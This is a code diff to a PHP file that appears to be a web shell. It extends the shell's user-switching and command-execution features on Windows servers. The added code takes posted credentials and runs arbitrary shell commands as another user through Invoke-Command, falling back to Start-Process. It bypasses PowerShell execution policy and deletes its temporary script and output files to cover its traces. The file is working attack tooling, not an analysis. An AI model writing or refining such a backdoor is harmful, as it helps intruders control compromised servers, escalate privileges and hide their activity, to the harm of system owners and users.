@@ -251,11 +251,22 @@ if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
         $rid = mt_rand(10000,99999);
         $tmpf = $tmp . '\\esila_su_' . $rid . '.txt';
         $ps1 = $tmp . '\\esila_su_' . $rid . '.ps1';
-        $ps_script = '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
+        $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
+            . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
             . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
-            . 'Start-Process cmd -Credential $c -ArgumentList "/c whoami" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($tmpf) . "\r\n"
-            . 'Get-Content ' . ps_quote($tmpf) . "\r\n"
-            . 'Remove-Item ' . ps_quote($tmpf) . ', ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
+            . "try {\r\n"
+            . "  \$r = Invoke-Command -ComputerName localhost -Credential \$c -ScriptBlock { whoami } 2>&1\r\n"
+            . "  \$r\r\n"
+            . "} catch {\r\n"
+            . "  try {\r\n"
+            . '    Start-Process cmd -Credential $c -ArgumentList "/c whoami" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($tmpf) . "\r\n"
+            . '    Get-Content ' . ps_quote($tmpf) . "\r\n"
+            . '    Remove-Item ' . ps_quote($tmpf) . " -Force -ErrorAction SilentlyContinue\r\n"
+            . "  } catch {\r\n"
+            . "    Write-Output \$_.Exception.Message\r\n"
+            . "  }\r\n"
+            . "}\r\n"
+            . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
         @file_put_contents($ps1, $ps_script);
         $test = esila_exec('powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1');
         @unlink($ps1);
@@ -310,11 +321,22 @@ if (isset($_POST['cmd'])) {
             $errf = $tmp . '\\esila_e' . $r . '.txt';
             $ps1 = $tmp . '\\esila_r' . $r . '.ps1';
             $cmd_esc = str_replace('"', '`"', $basecmd);
-            $ps_script = '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
+            $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
+                . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
                 . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
-                . 'Start-Process cmd -Credential $c -ArgumentList "/c ' . $cmd_esc . '" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($outf) . ' -RedirectStandardError ' . ps_quote($errf) . "\r\n"
-                . 'Get-Content ' . ps_quote($outf) . ', ' . ps_quote($errf) . "\r\n"
-                . 'Remove-Item ' . ps_quote($outf) . ', ' . ps_quote($errf) . ', ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
+                . "\$cmd = " . ps_quote($basecmd) . "\r\n"
+                . "try {\r\n"
+                . "  Invoke-Command -ComputerName localhost -Credential \$c -ScriptBlock { param(\$x) cmd /c \$x } -ArgumentList \$cmd\r\n"
+                . "} catch {\r\n"
+                . "  try {\r\n"
+                . '    Start-Process cmd -Credential $c -ArgumentList "/c ' . $cmd_esc . '" -NoNewWindow -Wait -RedirectStandardOutput ' . ps_quote($outf) . ' -RedirectStandardError ' . ps_quote($errf) . "\r\n"
+                . '    Get-Content ' . ps_quote($outf) . ', ' . ps_quote($errf) . "\r\n"
+                . '    Remove-Item ' . ps_quote($outf) . ', ' . ps_quote($errf) . " -Force -ErrorAction SilentlyContinue\r\n"
+                . "  } catch {\r\n"
+                . "    Write-Output \$_.Exception.Message\r\n"
+                . "  }\r\n"
+                . "}\r\n"
+                . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
             @file_put_contents($ps1, $ps_script);
             $exec = 'powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1';
         } else {
